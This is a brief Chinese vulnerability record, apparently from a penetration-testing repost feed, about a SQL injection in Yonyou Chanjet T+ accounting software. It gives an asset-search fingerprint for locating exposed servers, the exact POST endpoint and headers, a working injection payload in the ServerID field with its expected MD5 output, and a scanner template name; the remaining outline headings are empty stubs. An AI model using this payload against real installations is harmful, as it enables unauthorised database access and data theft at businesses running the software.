# 用友畅捷通TPlusInitServerInfo存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="畅捷通 T+"`
- **请求**：`POST /tplus/UFAQD/InitServerInfo.aspx?preload=1 HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 113`

**请求体 / payload**
```
operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','123456'))))%2b'1
0xce0bfd15059b68d67688884d7a3d3e8c
\[yongyoutplus-initserverinfo-sqli.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友畅捷通TPlus InitServerInfo存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友畅捷通TPlus